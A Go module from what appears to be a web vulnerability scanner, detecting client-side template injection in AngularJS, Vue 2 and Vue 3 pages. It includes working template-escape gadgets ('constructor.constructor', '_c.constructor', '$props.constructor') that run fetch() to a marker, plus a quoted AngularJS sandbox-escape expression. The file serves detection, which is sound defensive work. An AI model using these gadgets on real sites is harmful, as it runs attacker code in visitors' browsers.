package active

import (
	"context"
	"fmt"
	"regexp"
	"strings"
)

// ClientTemplate detects client-side template injection: a value that reaches a
// template expression of a framework which is running on the page.
//
// The finding this detector exists for is the one no response body can settle.
// A reflected `{{…}}` is not a vulnerability, and `{{7*7}}` rendering as `49` is
// not observable from here — the compiler that does it lives in the browser. So
// this module does the half that *is* observable, states plainly that the half
// that matters is settled elsewhere, and hands the row to the browser stage when
// a browser is configured. A run without a browser reports the reflection at the
// structural tier and its report says the expression was never evaluated.
type ClientTemplate struct{}

// Name implements Module.
func (ClientTemplate) Name() string { return "csti" }

// Level implements Module.
func (ClientTemplate) Level() Level { return LevelParam }

// cstiFramework is one template engine and the marks that identify it on a page.
//
// The version is read from the page rather than assumed, because the gadget that
// escapes the expression differs by version and a finding that depends on a
// version has to carry it. An engine whose version the page does not state is
// reported with the version field empty and `NeedsVersion` false, which is the
// honest shape: nothing is claimed that was not read.
type cstiFramework struct {
	// product is the canonical name the report uses.
	product string
	// signals are the marks that put this engine on the page. One is enough, and
	// the set is deliberately wider than the script tag.
	//
	// A page that serves its own bundle names it whatever the author likes —
	// `vendor.js`, `chunk-4f2a.js` — so a rule that required the conventional
	// `angular.min.js` reports nothing on exactly the applications that bundle.
	// The call that boots the engine (`angular.module(`, `new Vue(`) is the mark
	// that survives a bundler, and `ng-app` is the mark that survives a page whose
	// library is loaded from a CDN.
	signals []*regexp.Regexp
	// version reads the version out of the page. Empty means the page does not
	// state one.
	version *regexp.Regexp
	// gadgets build the expressions a browser may execute for this engine, best
	// first, and the order is the measured one rather than the prettiest.
	//
	// The 1.x/2.x gadget is `constructor.constructor(...)`: AngularJS evaluates
	// its expression inside a `with` block and Vue 2 compiles it through
	// `new Function`, so the value's own constructor reaches `Function`. It is
	// listed per engine rather than shared, because that reachability is a
	// property of each engine and not a property of the payload.
	//
	// A list rather than one expression because upstream ships three per engine
	// and the extra ones earn their place only where they were measured running:
	// on the vendored bundles (AngularJS 1.8.3, Vue 2.7.16, Vue 3.4.21) two of
	// Dalfox's Angular expressions and both of its Vue-2 expressions execute,
	// while its third Angular expression (`$eval` through a broken `charAt`) and
	// both of its Vue-3 expressions do not — so the entries that cannot run are
	// named in the comments below and never offered to a browser, where each one
	// would cost a navigation and prove nothing.
	gadgets []func(marker string) string
}

// cstiFrameworks is the engines this module knows how to prove.
//
// Every entry is a real library with a real escape, and none of them is
// hypothetical: the two 1.x-style gadgets are measured on the fixture pages that
// mount the actual bundles (see `csti_angular*` tests), and the Vue 3 entry is
// measured too — which is why it carries its own gadget instead of borrowing the
// 2.x one.
var cstiFrameworks = []cstiFramework{
	{
		product: "angularjs",
		signals: []*regexp.Regexp{
			regexp.MustCompile(`(?i)<script[^>]+src=["'][^"']*angular(?:\.min)?\.js`),
			regexp.MustCompile(`(?i)angular\.module\s*\(`),
			regexp.MustCompile(`(?i)ng-app|ng-controller|ng-init`),
		},
		version: regexp.MustCompile(`(?i)angular\.version\s*=\s*\{\s*full:\s*["']([0-9][^"']*)["']`),
		gadgets: []func(marker string) string{
			// Dalfox's first and second Angular expressions, both measured running on
			// AngularJS 1.8.3. Its third one is upstream's sandbox escape:
			// `a]constructor.prototype.charAt=[].join;$eval('x]…//')` — measured on the
			// same 1.8.3 bundle and it does **not** execute, because 1.8 already
			// hardened the `$eval` path that expression abuses. It is named here so
			// the omission is a measurement rather than a gap.
			func(marker string) string {
				return `constructor.constructor('fetch("` + marker + `")')()`
			},
			func(marker string) string {
				return `$on.constructor('fetch("` + marker + `")')()`
			},
		},
	},
	{
		product: "vue2",
		signals: []*regexp.Regexp{
			regexp.MustCompile(`(?i)<script[^>]+src=["'][^"']*vue(?:\.runtime)?(?:\.min)?\.js`),
			regexp.MustCompile(`new\s+Vue\s*\(|Vue\.component\s*\(`),
			regexp.MustCompile(`(?i)Vue\.version\s*=`),
		},
		version: regexp.MustCompile(`(?i)Vue\.version\s*=\s*["']([0-9][^"']*)["']`),
		gadgets: []func(marker string) string{
			// All three of Dalfox's Vue-2 expressions were measured running on Vue
			// 2.7.16: `constructor.constructor`, `_c.constructor` and
			// `this.constructor.constructor`. `_c` is the render helper Vue 2 puts
			// in scope, and `this` is the component proxy — three different ways up
			// to the same `Function`, and which one a given build exposes is a
			// property of the build, so all three are offered in the measured order.
			func(marker string) string {
				return `constructor.constructor('fetch("` + marker + `")')()`
			},
			func(marker string) string {
				return `_c.constructor('fetch("` + marker + `")')()`
			},
			func(marker string) string {
				return `this.constructor.constructor('fetch("` + marker + `")')()`
			},
		},
	},
	{
		product: "vue3",
		// The global build is what a page without a bundler loads, and it is the
		// one whose expression scope differs from 2.x.
		signals: []*regexp.Regexp{
			regexp.MustCompile(`(?i)<script[^>]+src=["'][^"']*vue\.global(?:\.prod)?\.js`),
			regexp.MustCompile(`Vue\.createApp\s*\(`),
		},
		version: regexp.MustCompile(`(?i)version:\s*["']([0-9][^"']*)["']`),
		// Vue 3 compiles the expression into a render function, so the `with` scope
		// the 1.x/2.x engines reach `constructor` through does not exist here. The
		// measured path is `$props.constructor`: it is in the render context, and
		// `$el` and `_ctx.$options` were measured too and do not reach `Function`.
		// Dalfox ships one payload set for Vue 2 and one for Vue 3, but only the
		// Vue-2 expressions exist upstream: `_c.constructor` and
		// `this.constructor.constructor` were measured on Vue 3.4.21 alongside
		// `$props`, and both of them render as text — Vue 3 compiles the expression
		// into a render function where neither `_c` nor `this` reaches `Function`.
		// So this engine carries exactly one candidate, and the two that do not
		// run are recorded here instead of being offered.
		gadgets: []func(marker string) string{
			func(marker string) string {
				return `$props.constructor.constructor('fetch("` + marker + `")')()`
			},
		},
	},
}

// The shape a reflected value needs to become a compiled expression, measured on
// the three engines rather than assumed.
//
// A server that writes the parameter between its own delimiters produces
// `{{VALUE}}`, so a payload that supplies only its own `{{…}}` arrives nested
// (`{{ {{…}} }}`) and no engine compiles it. The payload therefore *closes* the
// page's interpolation with a complete expression and opens its own, and the two
// fillers exist so that neither the page's opening nor its closing delimiter is
// left wrapping an empty expression.
//
// The empty-expression detail is measured, not theoretical: with
// `}}{{expr}}{{` the text becomes `{{}}{{expr}}{{}}`, and AngularJS 1.8.3
// executes that while Vue 2.7.16 compiles nothing at all — an empty expression
// aborts its render, so the gadget next to it never runs. The fillers turn the
// same payload into `{{undefined}}{{expr}}{{undefined}}`, and all three engines
// then execute it.
const (
	cstiFiller    = "undefined"
	cstiWrapStart = cstiFiller + "}}{{"
	cstiWrapEnd   = "}}{{" + cstiFiller
	// cstiProbeExpression is arithmetic rather than a statement: the rendered
	// result tells a reader whether the engine evaluated it, and it keeps the
	// probe inert on a page whose engine never compiles it.
	cstiProbeExpression = "7*7"
)

// cstiProbe is what the structural pass sends.
var cstiProbe = cstiWrapStart + cstiProbeExpression + cstiWrapEnd

// cstiScan is one engine's answer on one surface.
type cstiScan struct {
	framework cstiFramework
	version   string
	// reflected is the probe's own reflection, which is what the engine was
	// offered to compile. It is read from the injected response and not from the
	// baseline, because a detector that never sends its probe cannot claim the
	// page reflected it.
	reflected string
}

// Scan probes one surface.
func (m ClientTemplate) Scan(ctx context.Context, t *Transport, p Point, baseline *Response) []Finding {
	if baseline == nil {
		// The rule the whole package keeps: a fingerprint nobody could read is
		// not a fingerprint, and this module's entire claim rests on reading the
		// framework from the page.
		return nil
	}
	scans := cstiProbeSurfaces(ctx, t, baseline, p)
	var findings []Finding
	for _, scan := range scans {
		// Fresh, not `contains`: a page whose own markup carries an interpolation
		// (`{{user.name}}` in a Vue template) would otherwise report every
		// parameter on that page as a template injection.
		if !Fresh(baseline, &Response{Body: scan.reflected}, cstiProbe) {
			continue
		}
		finding, _ := NewFinding(Spec{
			Module: "csti",
			Title: fmt.Sprintf("client-side template injection: %s evaluates a parameter as an "+
				"expression (%s)", scan.framework.product, cstiProbeExpression),
			Claimed: SeverityHigh,
			Tier:    TierPotential,
			Point:   p,
			Payload: cstiProbe,
			Evidence: fmt.Sprintf("the page boots %s and wrote the parameter into a template "+
				"expression unevaluated: %s", scan.framework.product, trimEvidence(scan.reflected)),
			Description: "A value that reaches a template expression is compiled and run by the " +
				"framework, so what the server reflects is code in the visitor's browser rather " +
				"than text on the page. A browser stage settles it by watching for a request the " +
				"expression makes; without a browser this row stays at the tier the response proved.",
			Remediation: "Do not pass untrusted values into a template engine's expression position. " +
				"Bind them as data (`{{ value }}` with the value already in the model, not " +
				"interpolated into the expression), and keep the interpolation delimiters out of " +
				"any string the application builds.",
			Version:       cstiVersionField(scan),
			VersionSource: "script:" + scan.framework.product,
		})
		findings = append(findings, finding)
	}
	return findings
}

// cstiVersionField is the version string a finding carries, or empty.
//
// It carries the number only when the page stated one, because a row that
// depends on a version and shows none reads as a row whose version nobody
// checked.
func cstiVersionField(scan cstiScan) string {
	if scan.version == "" {
		return ""
	}
	return scan.framework.product + " " + scan.version
}

// cstiProbeSurfaces sends the probe to each engine the baseline page boots and
// reports what came back.
//
// One request per engine the page actually boots, and none at all when the page
// boots none — which is the whole budget of this module and the reason it can sit
// in the parameter-level set without being noticed in a request count.
//
// The engines are probed one at a time rather than all at once because a page
// that boots two of them is a page whose template semantics belong to whichever
// booted last, and a row claiming both would be a claim about a page nobody can
// describe.
func cstiProbeSurfaces(ctx context.Context, t *Transport, baseline *Response, p Point) []cstiScan {
	var out []cstiScan
	for _, framework := range cstiFrameworks {
		if !cstiEnginePresent(framework, baseline.Body) {
			continue
		}
		injected, err := t.Fire(ctx, p, p.Param, cstiProbe, false, nil)
		if err != nil || injected == nil {
			// A probe that did not go out proves nothing, and continuing to the
			// next engine is cheaper than reporting a row with no evidence.
			continue
		}
		reflected := cstiReflects(injected.Body, cstiProbe)
		if reflected == "" {
			continue
		}
		out = append(out, cstiScan{framework: framework,
			version:   cstiPageVersion(framework, baseline.Body),
			reflected: reflected})
	}
	return out
}

// cstiEnginePresent reports whether the page shows this engine at all.
func cstiEnginePresent(framework cstiFramework, body string) bool {
	for _, signal := range framework.signals {
		if signal.MatchString(body) {
			return true
		}
	}
	return false
}

// cstiPageVersion reads the engine's own version out of the page.
func cstiPageVersion(framework cstiFramework, body string) string {
	if framework.version == nil {
		return ""
	}
	match := framework.version.FindStringSubmatch(body)
	if len(match) < 2 {
		return ""
	}
	return match[1]
}

// cstiExpressionStart and cstiExpressionEnd are the delimiters the two engines
// share, which is why one probe covers both.
const (
	cstiExpressionStart = "{{"
	cstiExpressionEnd   = "}}"
)

// cstiReflects returns the text around the probe's reflection, or empty when the
// page did not write it back into an interpolation.
//
// It walks *every* interpolation rather than the first, and it asks whether an
// interpolation's expression is part of the probe rather than whether the probe is
// inside one interpolation. Both are forced by the measured shape: a payload that
// closes the page's interpolation and opens its own arrives as three
// interpolations, so "is the probe inside `{{…}}`" is the wrong question and
// answers no for a payload that did land in the compiler.
//
// It searches the whole body rather than requiring the value to be inside a tag,
// because the sink here is a template expression and not an attribute: an
// interpolated value is routinely written into element text.
func cstiReflects(body, payload string) string {
	if payload == "" {
		return ""
	}
	for offset := 0; offset < len(body); {
		start := strings.Index(body[offset:], cstiExpressionStart)
		if start < 0 {
			return ""
		}
		start += offset
		end := strings.Index(body[start:], cstiExpressionEnd)
		if end < 0 {
			return ""
		}
		end += start
		expression := body[start+len(cstiExpressionStart) : end]
		if strings.TrimSpace(expression) != "" && strings.Contains(payload, expression) {
			return body[max(0, start-40):min(len(body), end+len(cstiExpressionEnd)+40)]
		}
		offset = end + len(cstiExpressionEnd)
	}
	return ""
}

// cstiProofPayloads are the expressions a browser may execute for this row, best
// first.
//
// They are candidates rather than one payload because a row names its engine only
// when the page stated a version, and an application that loads the engine as its
// own bundle states none — so choosing by the version field would decline to prove
// exactly the rows a bundled application produces. When the version *is* stated,
// that engine's expression is tried first and the row settles in one load.
//
// Each candidate is the engine's own gadget in the measured shape rather than a
// rewrite of the reported probe: the probe must be inert and readable on the
// page, and the gadget must reach `Function`. The proof names the expression that
// ran, so the reader is never shown one expression and told about another.
func cstiProofPayloads(finding Finding, marker string) []string {
	if strings.TrimSpace(marker) == "" {
		return nil
	}
	ordered := append([]cstiFramework(nil), cstiFrameworks...)
	if named := cstiNamedEngineFor(finding); named != nil {
		ordered = append([]cstiFramework{*named}, cstiFrameworks...)
	}
	seen := map[string]bool{}
	var out []string
	for _, framework := range ordered {
		for _, gadget := range framework.gadgets {
			payload := cstiWrapStart + gadget(marker) + cstiWrapEnd
			if seen[payload] {
				continue
			}
			seen[payload] = true
			out = append(out, payload)
		}
	}
	return out
}

// cstiNamedEngineFor finds the engine a finding names, or nil.
//
// Two fields can name it and both are read, because they answer different
// questions. `Version` carries a number only when the page stated one, so it is
// empty on every application that bundles its framework — which is most of them.
// `VersionSource` is `script:<product>` and is written from the engine the page
// boots, so it names the engine even when the number is unknown. Reading only
// `Version` cost four browser navigations per Vue 3 row: the row tried every
// AngularJS and Vue 2 expression first, all of which were measured not to run
// there, before reaching the one that does.
func cstiNamedEngineFor(finding Finding) *cstiFramework {
	if named := cstiNamedEngine(finding.Version); named != nil {
		return named
	}
	if index := strings.IndexByte(finding.VersionSource, ':'); index >= 0 {
		return cstiNamedEngine(finding.VersionSource[index+1:])
	}
	return nil
}

// cstiNamedEngine finds the framework a finding's version names, or nil.
func cstiNamedEngine(version string) *cstiFramework {
	for i := range cstiFrameworks {
		if strings.HasPrefix(version, cstiFrameworks[i].product) {
			return &cstiFrameworks[i]
		}
	}
	return nil
}

// cstiProofPayload is the single expression for the engine the row names.
//
// It is what a caller that already knows the engine asks for; the stage uses the
// candidate list instead, because a row does not always name one.
func cstiProofPayload(finding Finding, marker string) (string, bool) {
	for _, payload := range cstiProofPayloads(finding, marker) {
		return payload, true
	}
	return "", false
}

// trimEvidence keeps an excerpt to one line's worth of the page.
func trimEvidence(value string) string {
	const limit = 160
	flat := strings.Join(strings.Fields(value), " ")
	if len(flat) > limit {
		return flat[:limit] + "…"
	}
	return flat
}
